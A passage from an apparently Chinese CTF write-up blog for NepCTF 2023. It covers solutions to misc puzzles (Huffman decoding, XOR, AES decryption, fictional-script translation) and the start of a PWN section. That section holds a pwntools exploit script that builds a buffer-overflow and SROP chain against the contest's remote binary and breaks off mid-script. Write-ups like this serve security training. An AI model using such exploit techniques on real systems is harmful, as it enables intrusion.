</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>input_file</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 解析频率信息</span>
</span></span><span class=line><span class=cl>    <span class=n>num_freq</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>frequencies</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>    <span class=n>offset</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>num_freq</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>byte</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>offset</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>freq</span> <span class=o>=</span> <span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>offset</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>offset</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>offset</span> <span class=o>+</span> <span class=mi>3</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=n>data</span><span class=p>[</span><span class=n>offset</span> <span class=o>+</span> <span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>frequencies</span><span class=p>[</span><span class=n>byte</span><span class=p>]</span> <span class=o>=</span> <span class=n>freq</span>
</span></span><span class=line><span class=cl>        <span class=n>offset</span> <span class=o>+=</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 构建 Huffman 树</span>
</span></span><span class=line><span class=cl>    <span class=n>root</span> <span class=o>=</span> <span class=n>build_huffman_tree</span><span class=p>(</span><span class=n>frequencies</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 解码压缩数据</span>
</span></span><span class=line><span class=cl>    <span class=n>decoded_data</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>current_node</span> <span class=o>=</span> <span class=n>root</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>byte</span> <span class=ow>in</span> <span class=n>data</span><span class=p>[</span><span class=n>offset</span><span class=p>:]:</span>
</span></span><span class=line><span class=cl>        <span class=n>byte_bits</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=n>byte</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>bit</span> <span class=ow>in</span> <span class=n>byte_bits</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>bit</span> <span class=o>==</span> <span class=s1>&#39;0&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>current_node</span> <span class=o>=</span> <span class=n>current_node</span><span class=o>.</span><span class=n>left</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>current_node</span> <span class=o>=</span> <span class=n>current_node</span><span class=o>.</span><span class=n>right</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>current_node</span><span class=o>.</span><span class=n>char</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>decoded_data</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>current_node</span><span class=o>.</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>current_node</span> <span class=o>=</span> <span class=n>root</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 写入解压缩后的数据到输出文件</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>output_file</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>decoded_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>compressed_file</span> <span class=o>=</span> <span class=s1>&#39;compressed.bin&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>decompressed_file</span> <span class=o>=</span> <span class=s1>&#39;decompressed.txt&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 解压缩文件</span>
</span></span><span class=line><span class=cl>    <span class=n>decompress</span><span class=p>(</span><span class=n>compressed_file</span><span class=p>,</span> <span class=n>decompressed_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Nepctf{huffman_zip_666}</span>
</span></span></code></pre></div><h3 id=codes>codes</h3><p>C语言在线平台</p><p>换行<code>\</code>绕过</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152341.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152341.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152341.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152341.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152341.png title=img></p><h3 id=小丁弹钢琴>小丁弹钢琴</h3><p>音频分析前半段是摩斯密码</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152342.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152342.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152342.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152342.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152342.png title=img></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>you</span> <span class=n>should</span> <span class=n>use</span> <span class=n>this</span> <span class=n>to</span>  <span class=n>xor</span> <span class=n>something</span>
</span></span></code></pre></div><p>后半段为一串十六进制数（侧着</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152343.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152343.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152343.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152343.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152343.png title=img></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=mh>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</span>
</span></span></code></pre></div><p>xor解密</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152344.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152344.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152344.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152344.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152344.png title=img></p><h3 id=你也喜欢三月七么>你也喜欢三月七么</h3><p>Nepnep星球如约举办CTF大赛，消息传播至各大星球，开拓者一行人应邀而来 ———————————————————————————————————————</p><p>三月七：耶，终于来到Nepnep星球啦，让我看看正在火热进行的Hacker夺旗大赛群聊。啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！</p><p>开拓者（U_id）：(端着下巴，磨蹭了一下，眼神若有所思）这好像需要经过啥256处理一下才能得到我们需要的关键。</p><p>三月七：那我们快想想怎么解开这个谜题！</p><p>flag格式:NepCTF{+m+}</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>salt_lenth= 10 
</span></span><span class=line><span class=cl>key_lenth= 16 
</span></span><span class=line><span class=cl>iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值
</span></span><span class=line><span class=cl>ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc
</span></span></code></pre></div><p>按题目描述，群名是salt（盐，所以咸），经过sha256后得到key（关键）</p><p>exp.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;88219bdee9c396eca3c637c0ea436058&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>salt</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;NepCTF2023&#34;</span>
</span></span><span class=line><span class=cl><span class=n>ciphertext</span> <span class=o>=</span> <span class=s2>&#34;b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc&#34;</span>
</span></span><span class=line><span class=cl><span class=n>ciphertext</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>salt</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()[:</span><span class=mi>32</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=n>t</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>m</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d</span>
</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152345.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152345.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152345.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152345.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152345.png title=img></p><p>得到一张图片的链接 <a href=https://img1.imgtp.com/2023/07/24/yOkXWSJT.png target=_blank rel="noopener noreffer">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152346.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152346.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152346.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152346.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152346.png title=img></p><p>猜测是新铁世界内文字，wiki上找到对应翻译表</p><p><a href=https://starrail.huijiwiki.com/wiki/%e6%96%87%e5%ad%97%e5%af%b9%e7%85%a7%e8%a1%a8 target=_blank rel="noopener noreffer">https://starrail.huijiwiki.com/wiki/%E6%96%87%E5%AD%97%E5%AF%B9%E7%85%A7%E8%A1%A8</a></p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152347.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152347.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152347.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152347.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152347.png title=img></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>NepCTF</span><span class=p>{</span><span class=n>HRP_aIways_likes_March_7th</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1># 永远喜欢三月七(。・ω・。)</span>
</span></span></code></pre></div><h3 id=陌生的语言>陌生的语言</h3><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152348.jpg data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152348.jpg, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152348.jpg 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152348.jpg 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152348.jpg title=img></p><p>hint:A同学的英文名为“Atsuko Kagari&rsquo;”</p><p>是动漫小魔女学院里的女主（之前没看过</p><p>贴吧看世界设定，发现有个叫新月文字（下面月亮），接着找发现还有个古龙语（上面箭头）</p><p><a href="https://tieba.baidu.com/p/4960864131?fid=7825124&pid=103320700708#103320700708" target=_blank rel="noopener noreffer">https://tieba.baidu.com/p/4960864131?fid=7825124&pid=103320700708#103320700708</a></p><p><a href=https://tieba.baidu.com/p/4945307221 target=_blank rel="noopener noreffer">https://tieba.baidu.com/p/4945307221</a></p><p><a href=https://ay.medyotan.ga/lunanova/index.htm target=_blank rel="noopener noreffer">在线转换Luna语</a></p><p><a href=https://tieba.baidu.com/p/8547884830#/ target=_blank rel="noopener noreffer">https://tieba.baidu.com/p/8547884830#/</a> 找到对应的翻译表</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152349.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152349.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152349.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152349.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152349.png title=img></p><p>后半段 HEART_IS_YOUR_MAGIC</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152350.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152350.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152350.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152350.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152350.png title=img></p><p>前半段 NEPNEP_A_BELIEVING</p><p>最终 NepCTF{NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152351.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152351.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152351.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152351.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152351.png title=img></p><h3 id=connectedfive>ConnectedFive</h3><p>万宁五子棋，率先到42就win</p><p>（nc老是掉，折磨。。。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152352.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152352.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152352.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152352.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152352.png title=img></p><h2 id=pwn>PWN</h2><h3 id=srop>srop</h3><p>exp.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>multiprocessing</span> <span class=kn>import</span> <span class=n>process</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>signal</span> <span class=kn>import</span> <span class=n>pause</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>socket</span> <span class=kn>import</span> <span class=n>timeout</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>choice</span><span class=o>=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>choice</span><span class=o>==</span><span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./pwn&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>=</span><span class=n>remote</span><span class=p>(</span><span class=s2>&#34;nepctf.1cepeak.cn&#34;</span><span class=p>,</span> <span class=mi>30518</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span>         <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>        <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span>        <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>        <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span>        <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>data</span>      <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>data</span>      <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span>         <span class=o>=</span> <span class=k>lambda</span> <span class=n>num</span><span class=o>=</span><span class=mi>4096</span>    <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rl</span>        <span class=o>=</span> <span class=k>lambda</span>             <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>keepends</span> <span class=o>=</span> <span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span>        <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>           <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>itr</span>       <span class=o>=</span> <span class=k>lambda</span>             <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>uu32</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>        <span class=p>:</span><span class=n>u32</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uu64</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>        <span class=p>:</span><span class=n>u64</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>addr</span>   <span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>{}</span><span class=s1> = </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>addr</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>libc_os</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>           <span class=p>:</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>x</span>
</span></span><span class=line><span class=cl><span class=n>libc_sym</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>           <span class=p>:</span><span class=n>libc_os</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=n>x</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_sh</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>debug</span><span class=p>(</span><span class=n>cmd</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=n>cmd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./pwn&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc=ELF(&#39;./libc-2.35.so&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc=ELF(&#39;./libc-2.31.so&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc-2.27.so&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc=ELF(&#39;./libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc=ELF(&#39;./libc.so&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rdi</span><span class=o>=</span><span class=mh>0x0000000000400813</span>
</span></span><span class=line><span class=cl><span class=n>rsi_r15</span><span class=o>=</span><span class=mh>0x0000000000400811</span>
</span></span><span class=line><span class=cl><span class=n>bss</span><span class=o>=</span><span class=mh>0x601500</span><span class=o>+</span><span class=mh>0x30</span>
</span></span><span class=line><span class=cl><span class=n>lea</span><span class=o>=</span><span class=mh>0x40078D</span>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=o>=</span><span class=mh>0x400754</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span><span class=o>=</span><span class=mh>0x4007a8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>got</span><span class=o>=</span><span class=mh>0x0000000000600FE8</span>
</span></span><span class=line><span class=cl><span class=n>sys_plt</span><span class=o>=</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;syscall&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1>#ru(&#39;welcome to NepCTF2023!\n&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=p>(</span><span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pl</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x30</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>bss</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>lea</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>pl</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>=</span><span class=n>SigreturnFrame</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rax</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=mi>1</span>  <span class=c1># &#34;/bin/sh\x00&#34;</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdx</span> <span class=o>=</span> <span class=n>got</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rcx</span><span class=o>=</span><span class=mh>0x50</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>sys_plt</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsp</span><span class=o>=</span><span class=n>bss</span><span class=o>-</span><span class=mh>0x30</span><span class=o>+</span><span class=mh>0x148</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rbp</span><span class=o>=</span><span class=n>bss</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pl</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;./flag</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x30</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pl</span><span class=o>+=</span><span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>rdi</span><span class=p>,</span><span class=mi>15</span><span class=p>,</span><span class=n>sys_plt</span><span class=p>)</span><span class=o>+</span><span class=nb>bytes</span><span class=p>(</span><span class=n>frame</span><span class=p>)</span><span class=o>+</span><span class=n>flat</span><span class=p>(</span><span class=n>lea</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
